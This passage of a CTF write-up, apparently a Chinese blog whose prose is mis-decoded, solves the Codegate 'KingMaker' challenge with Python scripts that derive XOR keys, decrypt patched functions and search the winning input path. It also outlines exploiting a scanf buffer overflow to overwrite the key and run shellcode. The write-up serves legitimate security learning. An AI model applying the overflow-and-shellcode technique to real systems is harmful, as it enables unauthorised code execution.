range(length):</span><br><span class="line">        key += chr(func[i] ^ prologue[i])</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">func1 = [<span class="number">0x39</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xd6</span>, <span class="number">0x24</span>, <span class="number">0xcc</span>, <span class="number">0x9a</span>]</span><br><span class="line">key1 = test(func1, len(func1))</span><br><span class="line"><span class="keyword">print</span> key1</span><br><span class="line"><span class="comment"># lOv3</span></span><br><span class="line">func2 = [<span class="number">0x11</span>, <span class="number">0x78</span>, <span class="number">0xe5</span>, <span class="number">0xd4</span>, <span class="number">0x0c</span>, <span class="number">0xb3</span>, <span class="number">0x80</span>]</span><br><span class="line">key2 = test(func2, len(func2))</span><br><span class="line"><span class="keyword">print</span> key2</span><br><span class="line"><span class="comment"># D0l1</span></span><br><span class="line">func3 = [<span class="number">0x1D</span>, <span class="number">0x3D</span>, <span class="number">0xC7</span>, <span class="number">0x82</span>, <span class="number">0x1A</span>, <span class="number">0xDA</span>, <span class="number">0xB8</span>, <span class="number">0x11</span>, <span class="number">0x25</span>, <span class="number">0xBA</span>, <span class="number">0x35</span>]</span><br><span class="line">key3 = test(func3, len(func3))</span><br><span class="line"><span class="keyword">print</span> key3</span><br><span class="line"><span class="comment"># HuNgRYT1m3</span></span><br><span class="line">func4 = [<span class="number">0x13</span>, <span class="number">0x78</span>, <span class="number">0xFC</span>, <span class="number">0xB7</span>, <span class="number">0x1B</span>, <span class="number">0xB0</span>, <span class="number">0x8D</span>, <span class="number">0x73</span>, <span class="number">0x78</span>, <span class="number">0xE7</span>, <span class="number">0x3B</span>, <span class="number">0xD8</span>, <span class="number">0x11</span>]</span><br><span class="line">key4 = test(func4, len(func4))</span><br><span class="line"><span class="keyword">print</span> key4</span><br><span class="line"><span class="comment"># F0uRS3aS0n</span></span><br><span class="line">func5 = [<span class="number">0x01</span>, <span class="number">0x79</span>, <span class="number">0xE2</span>, <span class="number">0xB1</span>, <span class="number">0x7C</span>, <span class="number">0xE8</span>, <span class="number">0xB8</span>, <span class="number">0x10</span>, <span class="number">0x03</span>, <span class="number">0xE2</span>, <span class="number">0x29</span>, <span class="number">0xD9</span>]</span><br><span class="line">key5 = test(func5, len(func5))</span><br><span class="line"><span class="keyword">print</span> key5</span><br><span class="line"><span class="comment"># T1kT4kT0Kk</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±ç›´æ¥å°†è¢«åŠ å¯†çš„å‡½æ•°patchä¸€ä¸‹ï¼Œè¿›ä¸€æ­¥çœ‹çœ‹ã€‚éœ€è¦patchçš„å…¶å®å¾ˆå¤šï¼Œå·¥ç¨‹æµ©å¤§ï¼Œè´´ä¸Šè½¬è‡ªå¤§ä½¬çš„<a href="https://tcode2k16.github.io/blog/posts/2019-01-27-codegate-qualifier-writeup/#solution-3" target="_blank" rel="noopener">patchè„šæœ¬</a>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">key1 = <span class="string">'lOv3'</span></span><br><span class="line">key2 = <span class="string">'D0l1'</span></span><br><span class="line">key3 = <span class="string">'HuNgRYT1m3'</span></span><br><span class="line">key4 = <span class="string">'F0uRS3aS0n'</span></span><br><span class="line">key5 = <span class="string">'T1kT4kT0Kk'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(arr, key)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">        arr[i] = arr[i] ^ ord(key[i % len(key)])</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line">patches = [</span><br><span class="line">  (<span class="number">0x341D</span>, <span class="number">0xf0</span>, key1),</span><br><span class="line">  (<span class="number">0x33FF</span>, <span class="number">0x1e</span>, key1),</span><br><span class="line">  (<span class="number">0x330F</span>, <span class="number">0xf0</span>, key1),</span><br><span class="line">  (<span class="number">0x32DE</span>, <span class="number">0x31</span>, key1),</span><br><span class="line">  (<span class="number">0x32C0</span>, <span class="number">0x1e</span>, key1),</span><br><span class="line">  (<span class="number">0x3197</span>, <span class="number">0x129</span>, key1),</span><br><span class="line">  (<span class="number">0x30D4</span>, <span class="number">0x0C3</span>, key1),</span><br><span class="line"></span><br><span class="line">  (<span class="number">0x2D55</span>, <span class="number">0x0FA</span>, key2),</span><br><span class="line">  (<span class="number">0x2C25</span>, <span class="number">0x112</span>, key2),</span><br><span class="line">  (<span class="number">0x2D37</span>, <span class="number">0x1e</span>, key2),</span><br><span class="line">  (<span class="number">0x27E9</span>, <span class="number">0x44</span>, key2),</span><br><span class="line">  (<span class="number">0x29B9</span>, <span class="number">0x0E6</span>, key2),</span><br><span class="line">  (<span class="number">0x2B2B</span>,<span class="number">0x0FA</span>, key2),</span><br><span class="line">  (<span class="number">0x271C</span>, <span class="number">0x0CD</span>, key2),</span><br><span class="line">  (<span class="number">0x28B5</span>, <span class="number">0xe6</span>, key2),</span><br><span class="line">  (<span class="number">0x299B</span>, <span class="number">0x1e</span>, key2),</span><br><span class="line">  (<span class="number">0x2A9F</span>, <span class="number">0x4E</span>, key2),</span><br><span class="line">  (<span class="number">0x2AED</span>, <span class="number">0x3e</span>, key2),</span><br><span class="line">  (<span class="number">0x282D</span>, <span class="number">0x44</span>, key2),</span><br><span class="line">  (<span class="number">0x2871</span>, <span class="number">0x44</span>, key2),</span><br><span class="line"></span><br><span class="line">  (<span class="number">0x20E2</span>, <span class="number">0x18d</span>, key3),</span><br><span class="line">  (<span class="number">0x201F</span>, <span class="number">0xc3</span>, key3),</span><br><span class="line"></span><br><span class="line">  (<span class="number">0x1B0A</span>, <span class="number">0xf0</span>, key4),</span><br><span class="line">  (<span class="number">0x19F2</span>, <span class="number">0x0FA</span>, key4),</span><br><span class="line">  (<span class="number">0x1AEC</span>, <span class="number">0x1e</span>, key4),</span><br><span class="line">  (<span class="number">0x192C</span>, <span class="number">0xa8</span>, key4),</span><br><span class="line">  (<span class="number">0x19D4</span>, <span class="number">0x1e</span>, key4),</span><br><span class="line">  (<span class="number">0x16D0</span>, <span class="number">0xc3</span>, key4),</span><br><span class="line"></span><br><span class="line">  (<span class="number">0x11BB</span>, <span class="number">0x131</span>, key5),</span><br><span class="line">  (<span class="number">0x0F25</span>, <span class="number">0x0DC</span>, key5),</span><br><span class="line">  (<span class="number">0x108B</span>, <span class="number">0x130</span>, key5),</span><br><span class="line">  (<span class="number">0x0DE7</span>, <span class="number">0x120</span>, key5),</span><br><span class="line">  (<span class="number">0x0F07</span>, <span class="number">0x1e</span>, key5),</span><br><span class="line">  (<span class="number">0x1001</span>, <span class="number">0x1e</span>, key5),</span><br><span class="line">  (<span class="number">0x101F</span>, <span class="number">0x4e</span>, key5),</span><br><span class="line">  (<span class="number">0x106D</span>, <span class="number">0x1e</span>, key5),</span><br><span class="line">  (<span class="number">0x0C8C</span>, <span class="number">0x158</span>, key5)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'patched'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> patched:</span><br><span class="line">  <span class="keyword">with</span> open(<span class="string">'./KingMaker'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> binary:</span><br><span class="line">    data = bytearray(binary.read())</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> offset, size, key <span class="keyword">in</span> patches:</span><br><span class="line">      data[offset:offset+size] = xor(data[offset:offset+size], key)</span><br><span class="line"></span><br><span class="line">    patched.write(data)</span><br><span class="line">    patched.close()</span><br></pre></td></tr></table></figure><p>æŠŠpatchåçš„elfæ‹–è¿›idaåï¼Œå°±èƒ½æŠŠæ‰€æœ‰çš„è¿‡ç¨‹ç†æ¸…æ¥šäº†ï¼Œæœ€éº»çƒ¦çš„æ–¹æ³•å°±æ˜¯æŠŠæ‰€æœ‰çš„å¯èƒ½éƒ½è®°å½•ä¸‹æ¥ï¼Œé€’å½’ä¸€ä¸‹ã€‚æ”¾ä¸Š<a href="https://devel0pment.de/?p=1179" target="_blank" rel="noopener">å¤§ä½¬çš„è„šæœ¬</a>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addArr</span><span class="params">(a,b)</span>:</span></span><br><span class="line">  c = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    c.append(a[i]+b[i])</span><br><span class="line">  <span class="keyword">return</span> c</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addLevel1</span><span class="params">(a)</span>:</span></span><br><span class="line">  x = [(<span class="string">"1,lOv3,1,2,1,1"</span>, [<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,1,2"</span>, [<span class="number">2</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,1,3"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,2,1"</span>, [<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,2,2"</span>, [<span class="number">2</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,2,3"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,3,1"</span>, [<span class="number">2</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,3,2"</span>, [<span class="number">2</span>,<span class="number">-1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">-1</span>]),</span><br><span class="line">       (<span class="string">"1,lOv3,1,2,3,3"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>])]</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    n = addArr(a,x[i][<span class="number">1</span>])</span><br><span class="line">    addLevel2(n,x[i][<span class="number">0</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addLevel2</span><span class="params">(a,s)</span>:</span></span><br><span class="line">  x = [(<span class="string">"D0l1,1,1,1,1,1"</span>, [<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">3</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,1,1,1,2"</span>, [<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,1,1,2,1"</span>, [<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">3</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,1,1,2,2"</span>, [<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,1,2,1"</span>, [<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">3</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,1,2,2"</span>, [<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,1,1,1,1"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,1,1,1,2"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,1,1,2,1"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,1,1,2,2"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,1,2,1"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,1,2,2"</span>, [<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,2,1,1,1"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,2,1,1,2"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,2,1,2,1"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,2,1,2,2"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,2,2,1"</span>, [<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,2,1,2,2,2"</span>, [<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,3,1,1,1,1"</span>, [<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,3,1,1,1,2"</span>, [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,3,1,1,2,1"</span>, [<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,3,1,1,2,2"</span>, [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,3,1,2,1"</span>, [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"D0l1,1,3,1,2,2"</span>, [<span class="number">2</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>])]</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    n = addArr(a,x[i][<span class="number">1</span>])</span><br><span class="line">    addLevel3(n,s+<span class="string">','</span>+x[i][<span class="number">0</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addLevel3</span><span class="params">(a, s)</span>:</span></span><br><span class="line">  x = [(<span class="string">"HuNgRYT1m3,1,1,2"</span>, [<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,1,2,1"</span>, [<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,1,2,3"</span>, [<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,2,1,2"</span>, [<span class="number">1</span>,<span class="number">-2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,2,2,1"</span>, [<span class="number">0</span>,<span class="number">-1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,2,2,3"</span>, [<span class="number">1</span>,<span class="number">-1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,3,1,2"</span>, [<span class="number">1</span>,<span class="number">-2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,3,2,1"</span>, [<span class="number">0</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"HuNgRYT1m3,3,2,3"</span>, [<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>])]</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    n = addArr(a,x[i][<span class="number">1</span>])</span><br><span class="line">    addLevel4(n, s+<span class="string">','</span>+x[i][<span class="number">0</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addLevel4</span><span class="params">(a,s)</span>:</span></span><br><span class="line">  x = [(<span class="string">"F0uRS3aS0n,1,1,AAAA,1,1,2"</span>, [<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"F0uRS3aS0n,1,1,AAAA,1,2"</span>, [<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>]),</span><br><span class="line">       (<span class="string">"F0uRS3aS0n,1,1,AAAA,2"</span>, [<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>])]</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    n = addArr(a,x[i][<span class="number">1</span>])</span><br><span class="line">    addLevel5(n,s+<span class="string">','</span>+x[i][<span class="number">0</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addLevel5</span><span class="params">(a,s)</span>:</span></span><br><span class="line">  x = [(<span class="string">"T1kT4kT0Kk,2,1,1,2,1"</span>, [<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>]),</span><br><span class="line">       (<span class="string">"T1kT4kT0Kk,2,1,2,2,1"</span>, [<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>]),</span><br><span class="line">       (<span class="string">"T1kT4kT0Kk,3,2,2,1"</span>, [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>])]</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    n = addArr(a,x[i][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">      <span class="keyword">if</span> (n[j] != <span class="number">5</span>): <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> (j == <span class="number">4</span>):</span><br><span class="line">        final = s+<span class="string">','</span>+x[i][<span class="number">0</span>]</span><br><span class="line">        print(final.replace(<span class="string">','</span>,<span class="string">'\n'</span>))</span><br><span class="line">        quit()</span><br><span class="line"> </span><br><span class="line">addLevel1([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>å°†è¾“å‡ºçš„è¿‡ç¨‹pipeåˆ°ncå°±è¡Œäº†ï¼š<code>./solve.py | nc 110.10.147.104 13152</code>ã€‚</p><p>å¤§ä½¬è¿˜ç»™å‡ºä¸€ç§pwnçš„åšæ³•ï¼Œä¹Ÿä¸æ˜¯å¾ˆå¤æ‚ã€‚æ˜¾ç„¶æ‰€æœ‰çš„<code>scanf(&quot;%s&quot;, &amp;buf);</code>éƒ½å­˜åœ¨bofï¼Œæ‰€æœ‰çš„keyéƒ½èƒ½æ˜¯å¯ä»¥è¢«è¦†ç›–ä¿®æ”¹çš„ï¼Œä¾‹å¦‚è¿™ä¸ªfuncï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">vul</span><span class="params">(__int64 key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  put_s(<span class="string">"King : You have only 1 chance."</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check(&amp;buf) )</span><br><span class="line">  &#123;</span><br><span class="line">    encrypt_func(sub_4016D0, dword_607114, (<span class="keyword">const</span> <span class="keyword">char</span> *)key);</span><br><span class="line">    sub_4016D0(<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  end_game(<span class="string">"King : Wrong! You don't have ability to solve the worries of the people!"</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…ˆæ˜¯è¦è¿‡checkï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">check</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">26</span>]; <span class="comment">// [rsp+30h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">26</span>]; <span class="comment">// [rsp+50h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+72h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v5, <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  <span class="built_in">strcpy</span>(v6, <span class="string">"ALICEAWTQJMJXTSPPZVCIDGQYRDINMCP"</span>);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, input, <span class="number">5u</span>LL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">5</span>; i &lt; <span class="built_in">strlen</span>(input); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5[(input[i] - <span class="number">65</span> + dest[v2] - <span class="number">65</span>) % <span class="number">26</span>] != v6[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    v2 = (v2 + <span class="number">1</span>) % <span class="number">5</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¦åˆæ¡ä»¶çš„å­—ä¸²ä¸º<code>AAAAAAWTQJMJXTSPPZVCIDGQYRDINMCP</code>ã€‚è¿‡äº†checkä¹‹åï¼Œè¦†ç›–æ‰keyï¼Œé€ä¸Šshellcodeå’Œkeyçš„å¼‚æˆ–ï¼Œå¹¶ä¸”ç¡®ä¿å¼‚æˆ–åçš„å­—ä¸²ä¸­ä¸å­˜åœ¨ä½¿scanfæ–­å¼€çš„å­—ç¬¦å³å¯ã€‚ä¹‹åç¨‹åºä¼šè°ƒç”¨<code>encrypt_func</code>è§£å¯†shellcodeæœ€åget shellã€‚<a 